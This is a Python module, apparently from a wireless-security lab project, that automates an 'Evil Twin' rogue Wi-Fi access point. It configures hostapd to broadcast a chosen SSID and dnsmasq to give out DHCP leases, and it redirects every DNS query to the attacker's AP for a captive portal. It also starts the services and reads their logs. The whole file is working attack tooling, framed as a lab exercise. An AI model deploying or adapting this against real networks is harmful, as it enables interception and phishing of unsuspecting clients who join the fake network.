import os
import signal
import subprocess
import time
from pathlib import Path
"""


Implements the Evil Twin access point creation stage.

Main responsibilities:
    - Prepare the selected Wi-Fi interface for AP mode.
    - Generate hostapd configuration for the fake Wi-Fi network.
    - Generate dnsmasq configuration for DHCP and DNS redirection.
    - Start hostapd and verify that the access point is enabled.
    - Start dnsmasq to provide IP addresses and DNS responses to connected clients.
    - Display hostapd and dnsmasq logs for testing and debugging.
    - Stop Evil Twin services and restore the interface to managed mode.
"""

PROJECT_DIR = Path(__file__).resolve().parent
CONFIG_DIR = PROJECT_DIR / "configs"

HOSTAPD_CONF = CONFIG_DIR / "hostapd_evil_twin.conf"
DNSMASQ_CONF = CONFIG_DIR / "dnsmasq_evil_twin.conf"

HOSTAPD_LOG = PROJECT_DIR / "hostapd.log"
DNSMASQ_LOG = PROJECT_DIR / "dnsmasq.log"

AP_IP = "192.168.50.1"
AP_CIDR = "192.168.50.1/24"


def require_root():
    if os.geteuid() != 0:
        print("[!] This module must run as root.")
        print("[!] Run it with:")
        print("    sudo python3")
        raise PermissionError("Root privileges required")


def run(cmd, check=False):
    print(f"[CMD] {' '.join(cmd)}")
    result = subprocess.run(cmd, text=True, capture_output=True)

    if result.stdout.strip():
        print(result.stdout.strip())

    if result.stderr.strip():
        print(result.stderr.strip())

    if check and result.returncode != 0:
        raise RuntimeError(f"Command failed: {' '.join(cmd)}")

    return result


def kill_services():
    print("[*] Stopping old services...")
    for name in ["hostapd", "dnsmasq", "wpa_supplicant", "tcpdump"]:
        subprocess.run(
            ["pkill", "-f", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    time.sleep(1)


def prepare_interface(interface):
    print(f"[*] Preparing interface: {interface}")

    subprocess.run(
        ["systemctl", "stop", "NetworkManager"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    commands = [
        ["ip", "link", "set", interface, "down"],
        ["iw", "dev", interface, "set", "type", "managed"],
        ["ip", "addr", "flush", "dev", interface],
        ["rfkill", "unblock", "wifi"],
        ["ip", "link", "set", interface, "up"],
    ]

    for cmd in commands:
        result = run(cmd)
        if result.returncode != 0:
            print("[!] Warning: command returned non-zero status.")

    print("[+] Interface prepared.")

def write_hostapd_config(interface, ssid, channel, password):
    CONFIG_DIR.mkdir(exist_ok=True)
    channel = int(channel)
    hw_mode = "g" if channel <= 14 else "a"
    content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""

    HOSTAPD_CONF.write_text(content)
    print(f"[+] Wrote hostapd config: {HOSTAPD_CONF}")


def write_dnsmasq_config(interface):
    CONFIG_DIR.mkdir(exist_ok=True)

    content = f"""interface={interface}
bind-interfaces

dhcp-range=192.168.50.10,192.168.50.50,255.255.255.0,12h
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
dhcp-authoritative

# Captive portal DNS redirection:
# every domain resolves to the attack AP address.
address=/#/{AP_IP}

log-dhcp
log-queries
"""

    DNSMASQ_CONF.write_text(content)
    print(f"[+] Wrote dnsmasq config: {DNSMASQ_CONF}")


def start_hostapd():
    print("[*] Starting hostapd...")

    HOSTAPD_LOG.write_text("")

    log_file = open(HOSTAPD_LOG, "w")

    proc = subprocess.Popen(
        ["hostapd", str(HOSTAPD_CONF)],
        stdout=log_file,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )

    time.sleep(4)

    log_text = HOSTAPD_LOG.read_text(errors="ignore")

    if "AP-ENABLED" not in log_text:
        print("[!] hostapd failed. AP was not enabled.")
        print("[!] Last hostapd log:")
        print("-" * 70)
        print(log_text[-2000:])
        print("-" * 70)

        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass

        return None

    print("[+] hostapd started successfully: AP-ENABLED")
    return proc


def start_dnsmasq(interface):
    print("[*] Assigning AP IP...")

    run(["ip", "addr", "add", AP_CIDR, "dev", interface])

    print("[*] Starting dnsmasq...")

    DNSMASQ_LOG.write_text("")

    log_file = open(DNSMASQ_LOG, "w")

    proc = subprocess.Popen(
        ["dnsmasq", "-C", str(DNSMASQ_CONF), "-d"],
        stdout=log_file,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )

    time.sleep(2)

    if proc.poll() is not None:
        log_text = DNSMASQ_LOG.read_text(errors="ignore")
        print("[!] dnsmasq failed.")
        print("[!] Last dnsmasq log:")
        print("-" * 70)
        print(log_text[-2000:])
        print("-" * 70)
        return None

    print("[+] dnsmasq started. Waiting for DHCP clients...")
    return proc


def show_logs():
    print("\n========== hostapd.log ==========")
    if HOSTAPD_LOG.exists():
        print(HOSTAPD_LOG.read_text(errors="ignore")[-4000:])
    else:
        print("No hostapd.log yet.")

    print("\n========== dnsmasq.log ==========")
    if DNSMASQ_LOG.exists():
        print(DNSMASQ_LOG.read_text(errors="ignore")[-4000:])
    else:
        print("No dnsmasq.log yet.")


def start_evil_twin(interface, ssid, channel, password):
    require_root()

    print("=" * 80)
    print("STARTING EVIL TWIN LAB AP")
    print("=" * 80)
    print(f"SSID:      {ssid}")
    print(f"Channel:   {channel}")
    print(f"Interface: {interface}")
    print("=" * 80)

    kill_services()
    prepare_interface(interface)
    write_hostapd_config(interface, ssid, channel, password)
    write_dnsmasq_config(interface)

    hostapd_proc = start_hostapd()

    if hostapd_proc is None:
        print("[!] Evil Twin AP did not start.")
        print("[!] Do NOT connect the iPad yet.")
        print("[!] Usually fix: reset USB adapter from VirtualBox, then try again.")
        return None, None

    dnsmasq_proc = start_dnsmasq(interface)

    if dnsmasq_proc is None:
        print("[!] AP is running, but DHCP failed.")
        print("[!] You can inspect dnsmasq.log.")
        return hostapd_proc, None

    print("\n[+] Evil Twin AP lab is running.")
    print("[+] Now connect your lab client device to the SSID.")
    print("[+] Look for these in the logs:")
    print("    hostapd.log  -> AP-STA-CONNECTED")
    print("    hostapd.log  -> EAPOL-4WAY-HS-COMPLETED")
    print("    dnsmasq.log  -> DHCPACK")
    print("\n[*] Logs:")
    print(f"    {HOSTAPD_LOG}")
    print(f"    {DNSMASQ_LOG}")

    return hostapd_proc, dnsmasq_proc


def stop_evil_twin(interface=None):
    require_root()

    print("[*] Stopping Evil Twin services...")
    kill_services()

    if interface:
        run(["ip", "addr", "flush", "dev", interface])
        run(["ip", "link", "set", interface, "down"])
        run(["iw", "dev", interface, "set", "type", "managed"])
        run(["ip", "link", "set", interface, "up"])

    print("[+] Evil Twin services stopped.")


if __name__ == "__main__":
    print("This file is meant to be imported from main.py or Python shell.")
    print("Example:")
    print('  start_evil_twin("wlxe84e06aed7ca", "iPhone_Lab", 6, "12345678")')